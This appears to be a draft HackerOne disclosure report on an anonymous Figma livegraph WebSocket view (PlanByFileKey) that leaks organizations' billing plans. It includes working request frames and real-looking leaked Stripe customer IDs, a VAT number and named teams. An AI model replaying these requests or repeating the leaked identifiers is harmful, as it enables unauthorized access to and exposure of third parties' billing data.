# H1 提交稿(复制到 hackerone.com/figma 提交页面)

## Title
Figma livegraph unauthenticated PlanByFileKey leaks full billing Plan (stripeCustomerId/VAT) of any org with a public file

## Asset
https://www.figma.com (livegraph WebSocket: wss://www.figma.com/api/livegraph)

## Severity
High

## Weakness
CWE-639 (Authorization Bypass Through User-Controlled Key)

Root cause: the Plan resource is reachable through multiple access paths with inconsistent authorization. PlanByOrgId and PlanByTeamId enforce Plan-layer authorization (anonymous requests are denied), but PlanByFileKey only verifies file-level readability and skips the Plan-layer check entirely. The file key (user-controlled input) therefore bypasses the authorization that protects the same billing/subscription data on other paths, letting an unauthenticated attacker obtain billing/subscription data of any org that owns a public file.

## Description

### Summary:
The Figma livegraph WebSocket endpoint (wss://www.figma.com/api/livegraph) accepts anonymous subscriptions (no session cookie; auth frame sends userId:null / anonymousUserId:null). The PlanByFileKey view accepts any file key and returns the full Plan object of the organization/team that owns the file — including stripeCustomerId, vatGstId (real VAT number), taxIdVerificationStatus, planRecordId, team/org name, tier, student team state, upgrade approval settings, and a large set of internal feature toggles.

Verified against a paid pro team (Themesberg/Flowbite): stripeCustomerId "cus_J1xwCSokJo6SMU", vatGstId "RO42244256", taxIdVerificationStatus "verified" — the complete billing and tax identity of a real paying company, obtained anonymously.

The only authorization check is "can the requester read the file" (file-level). There is no separate authorization check on the Plan layer. This is demonstrably a bug, not intended behavior: the same Plan data is denied to anonymous access via PlanByOrgId and PlanByTeamId views, but returned via PlanByFileKey whenever the file is readable.

The file key is trivially obtainable: public Figma files are indexed by Google, design blogs, and forums (figma.com/file/{key}/...).

### Steps To Reproduce:
1. Obtain any public Figma file key, e.g. ucha7bf05fJ81CJZVoruo0 (Flowbite Design System Pro, publicly linked) or CYs4jJGyYeUxpAVcJ2EAZ4 (Material 3 Design Kit).

2. Connect anonymously to the livegraph WebSocket (no cookies):
wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId=&anonUserId=&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48&preload=%7B%7D&requestedProtocolVersion=2&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2Fucha7bf05fJ81CJZVoruo0&connectionType=initial&reconnect=0

3. Send anonymous auth frame:
{"messageType":"auth","clientType":"web","args":{"userId":null,"anonymousUserId":null},"tags":{"clientType":"web","commitHash":"81855c2bc7c604648169c4e4333f43579bfa7464","clientUrl":"https://www.figma.com/file/ucha7bf05fJ81CJZVoruo0"},"clientRequestedVersion":2}

4. Subscribe to PlanByFileKey:
{"messageType":"subscribe","viewName":"PlanByFileKey","viewHash":"abababababababababababababababab","loadType":"initial","args":{"fileKey":"ucha7bf05fJ81CJZVoruo0"}}

5. The server returns the full Plan of the owning team (abridged):
{"fieldName":"plan","value":{
  "id":"team::947922137358580288",
  "type":"team",
  "tier":"pro",
  "stripeCustomerId":"cus_J1xwCSokJo6SMU",
  "vatGstId":"RO42244256",
  "taxIdVerificationStatus":"verified",
  "name":"Themesberg Team",
  "studentTeamState":"not_student_team",
  "planRecordId":"3fc8b88e-5cb5-4f50-9034-2f341d43ed12",
  "aiFeaturesEnabled":true,
  "aiDataSharingEnabled":true,
  "upgradeApprovalSettingsExpert":"instant_approval_if_available_seats",
  "upgradeApprovalSettingsDeveloper":"instant_approval_if_available_seats",
  "upgradeApprovalSettingsCollaborator":"instant_approval_if_available_seats",
  "upgradeApprovalSettingsContent":"instant_approval_if_available_seats",
  "key":{"parentId":"947922137358580288","type":"team"}
}}

6. The same anonymous session also returns the team's subscription and contract details:
- PlanSubscription: {"id":"fbecd3c2-ef4b-4061-ab8c-2ca30156e4fb","status":"active","createdAt":"2021-02-28T18:30:37.000Z","planParentId":"947922137358580288","planParentType":"Team"}
- Annual contract renewal date: {"property":"ANNUAL_CONTRACT_RENEWAL_DATE","value":"2027-02-28T18:30:37Z","planId":"947922137358580288","planType":"team"}

### Supporting Material/References:
Verified against 11 public files — all returned the full Plan anonymously:

1. ucha7bf05fJ81CJZVoruo0 (Flowbite Design System Pro): team::947922137358580288 "Themesberg Team", pro, stripeCustomerId cus_J1xwCSokJo6SMU, vatGstId RO42244256, taxIdVerificationStatus verified, planRecordId 3fc8b88e-...
2. CYs4jJGyYeUxpAVcJ2EAZ4 (Material 3 Design Kit): team::724875287175278511 "Team chi", starter, stripeCustomerId cus_IlEm1OntcEC6uH, planRecordId 792d795d-...
3. bv2nMIdFf4u3dESGail4sm: organization::1484997479016537761 "Figma Demo Org", enterprise, planRecordId 8c2cd314-..., PlanSubscription {id ca35e9e6-..., status "incomplete", createdAt 2025-03-25}
4. vU5NGHCW6Wc42ojtcAsaik: team::1342613656850409659 "muneeb client", planRecordId 906146d8-...
5. vtTXyIEof8A3ATUvtvUGVm: team::719152616611500478 "Let's Change", planRecordId 019b4633-...
6. KaKIakOIfbwGangSQknMGn: team::1284837764813071781 "Divyang Chaudhary's team", planRecordId 638d02a1-...
7. QDKl0fwEtUUZsaeVwfquBr: team::1561477094343212805 "Muhammad's Starter team", planRecordId 5a79520c-...
8. kbKhOEtojLYuCxVM7vDhpX: team::1109549061106124302 "alon zeevy", planRecordId 17402b63-...
9. NZicFoZQKbFQlE4Kg8D7N9: team::1330118218948541721 "Liam Collins's team", planRecordId 7d85bc9d-...
10. VRTXP8mnIln1FGL2RjkTSD: team::1071031152797182000 "Super Goyani's team", planRecordId 0c3b9d88-...
11. W8GEdfgjJaZ21YbP4exVxr: team::1302483498091091379 "Xosé Lustres's team", planRecordId 23fdf859-...

Control cases (proving the check is file-read based, not Plan based):
- Private file cQBfbmMrjx4WNnpCt79xwM -> empty response (denied)
- Invalid file key -> empty response

Attachments: flowbite_plan_clean.txt (raw WebSocket frames: full Plan + PlanSubscription + contract renewal date for Flowbite case), m3_plan_clean.txt (raw frame for M3 case).

## Impact
- Unauthenticated disclosure of billing & tax identity of paying companies: stripeCustomerId (usable for targeted phishing/social engineering and cross-referencing with leaked databases), vatGstId (real EU VAT number, e.g. RO42244256) and taxIdVerificationStatus (verified) — demonstrated against a real paid pro team (Themesberg/Flowbite).
- Subscription and contract details leaked: PlanSubscription status (active), creation date, and annual contract renewal date (2027-02-28) of the paid team.
- Internal organization configuration disclosure: plan tier, student team state, upgrade-approval policies for 4 roles, AI feature toggles, plugin/widget whitelist enforcement, public plugin allowance, template picker settings — competitive intelligence for any org with a public file.
- Org subscription metadata: PlanSubscription ID, status, creation timestamp (Org plans).
- Authorization model inconsistency proves this is a bug, not intended behavior: the same Plan data is denied anonymously via PlanByOrgId/PlanByTeamId, but returned via PlanByFileKey when the file is readable.
- Scale: any file with "anyone with link can view" or community/embedded public visibility; file keys are widely indexed and shared publicly (Google, design blogs, forums).
